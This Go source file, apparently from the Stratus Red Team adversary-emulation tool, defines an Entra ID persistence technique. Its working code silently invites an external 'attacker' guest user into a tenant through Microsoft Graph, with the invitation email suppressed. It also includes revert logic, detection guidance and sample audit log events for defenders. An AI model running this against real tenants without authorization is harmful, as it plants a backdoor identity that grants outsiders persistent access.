package entra_id

import (
	"context"
	_ "embed"
	"errors"
	"fmt"
	"github.com/aws/smithy-go/ptr"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"github.com/microsoftgraph/msgraph-beta-sdk-go/models"
	graphcore "github.com/microsoftgraph/msgraph-sdk-go-core"
	graphmodels "github.com/microsoftgraph/msgraph-sdk-go/models"
	"log"
	"os"
	"strings"
)

const codeBlock = "```"
const AttackTechniqueId = "entra-id.persistence.guest-user"
const DefaultAttackerEmail = `stratus-red-team@example.com`

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           AttackTechniqueId,
		FriendlyName: "Create Guest User",
		Description: `
Invites an external guest user in the tenant.

Warm-up: None

Detonation:

- Invite guest user (without generating an invitation email)

References:

- https://securitylabs.datadoghq.com/cloud-security-atlas/attacks/inviting-external-users/
- https://derkvanderwoude.medium.com/azure-subscription-hijacking-and-cryptomining-86c2ac018983
- https://dirkjanm.io/assets/raw/US-22-Mollema-Backdooring-and-hijacking-Azure-AD-accounts_final.pdf

!!! note

	By default, Stratus Red Team invites the e-mail <code>` + DefaultAttackerEmail + `</code>. However, you can override
	this behavior by setting the environment variable <code>` + utils.AttackerEmailEnvVarKey + `</code>, for instance:

	` + codeBlock + `bash
	export ` + utils.AttackerEmailEnvVarKey + `="you@domain.tld"
	stratus detonate ` + AttackTechniqueId + `
	` + codeBlock + `
`,
		Detection: `
Using [Entra ID audit logs](https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs) with the specific activity types:

- <code>Add user</code>
- <code>Invite external user</code>
- <code>Add user sponsor</code>

When the invited user accepts the invite, an additional event <code>Redeem external user invite</code> is logged. 

Sample events, shortened for clarity:

` + codeBlock + `json
{
  "category": "UserManagement",
  "result": "success",
  "activityDisplayName": "Invite external user",
  "loggedByService": "Invited Users",
  "initiatedBy": {
    "user": {
      "userPrincipalName": "<inviter@tenant.tld>",
    }
  },
  "userAgent": "",
  "targetResources": [
    {
      "displayName": "<invited user display name>",
      "type": "User",
      "userPrincipalName": "<invited-user-email>#EXT#@<tenant.tld>",
      "groupType": null,
      "modifiedProperties": []
    }
  ],
  "additionalDetails": [
    {
      "key": "invitedUserEmailAddress",
      "value": "<invited-user-email>"
    }
  ]
}
{
  "category": "UserManagement",
  "result": "success",
  "resultReason": null,
  "activityDisplayName": "Redeem external user invite",
  "loggedByService": "B2B Auth",
  "initiatedBy": {
    "user": {
      "userPrincipalName": "<invited-user-email>",
      "ipAddress": "<invited-user-ip>"
    }
  },
  "targetResources": [
    {
      "id": "d042c4fe-5dd1-44a2-883a-eede6c10608f",
      "displayName": "UPN: <invited-user-email>#EXT#<tenant.tld>, Email: <invited-user-email>, InvitationId: 4c93fc70-169a-411f-8cf7-aff732f8c7b9, Source: One Time Passcode",
      "type": "User",
      "userPrincipalName": "<invited-user-email>#EXT#<tenant.tld>"
    }
  ]
}
` + codeBlock + `
`,
		Platform:           stratus.EntraID,
		IsIdempotent:       false,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Persistence},
		Detonate:           detonate,
		Revert:             revert,
	})
}

func detonate(_ map[string]string, providers stratus.CloudProviders) error {
	graphClient := providers.EntraId().GetGraphClient()
	attackerPrincipal := getAttackerPrincipal()

	// Retrieve tenant ID
	tenantId, err := providers.EntraId().GetTenantId()
	if err != nil {
		return errors.New("could not retrieve tenant ID: " + err.Error())
	}

	// Invite Guest User
	log.Println("Inviting guest user " + attackerPrincipal + ", this can take a few seconds...")
	requestBody := graphmodels.NewInvitation()
	invitedUserEmailAddress := attackerPrincipal
	requestBody.SetInvitedUserEmailAddress(&invitedUserEmailAddress)
	requestBody.SetSendInvitationMessage(ptr.Bool(false)) // Don't send the invitation message
	inviteRedirectUrl := fmt.Sprintf("https://myapplications.microsoft.com/?tenantid=%s", tenantId)
	requestBody.SetInviteRedirectUrl(&inviteRedirectUrl)

	response, err := graphClient.Invitations().Post(context.Background(), requestBody, nil)

	if err != nil {
		return errors.New("could not invite user: " + err.Error())
	}

	log.Println("Successfully invited guest user " + attackerPrincipal + " in the tenant")
	log.Println("To simulate accepting the invite, you can visit the following URL from an incognito browsing session: " + *response.GetInviteRedeemUrl())

	return nil
}

func revert(_ map[string]string, providers stratus.CloudProviders) error {
	// Initialize Graph client
	graphClient := providers.EntraId().GetGraphClient()
	attackerPrincipal := getAttackerPrincipal()
	attackerPrefix := strings.Split(attackerPrincipal, "@")

	// 1. Get ID of invited Guest User
	userResult, err := graphClient.Users().Get(context.Background(), nil)
	if err != nil {
		return errors.New("could not retrieve users: " + err.Error())
	}

	// We need to paginate through the results
	var userId string
	iterator, err := graphcore.NewPageIterator[*graphmodels.User](userResult, graphClient.GetAdapter(), models.CreateUserCollectionResponseFromDiscriminatorValue)
	if err != nil {
		return errors.New("could not create users iterator: " + err.Error())
	}

	err = iterator.Iterate(context.Background(), func(user *graphmodels.User) bool {
		userPrincipal := *user.GetUserPrincipalName()
		if strings.Contains(userPrincipal, attackerPrefix[0]) {
			userId = *user.GetId()
			return false // stop iterating
		}
		return true // continue iterating
	})
	if err != nil {
		return errors.New("could not iterate over users: " + err.Error())
	}

	if userId == "" {
		log.Println("could not find guest user " + attackerPrincipal + " in the tenant, maybe you removed it manually?")
		log.Println("assuming the user was already removed and there's nothing left to revert")
		return nil
	}

	// 2. Delete Guest User
	err = graphClient.Users().ByUserId(userId).Delete(context.Background(), nil)
	if err != nil {
		return errors.New("could not delete guest user: " + err.Error())
	}

	log.Println("Deleted guest user " + attackerPrincipal)

	return nil
}

func getAttackerPrincipal() string {
	if attackerPrincipal := os.Getenv(utils.AttackerEmailEnvVarKey); attackerPrincipal != "" {
		return attackerPrincipal
	}
	return DefaultAttackerEmail
}
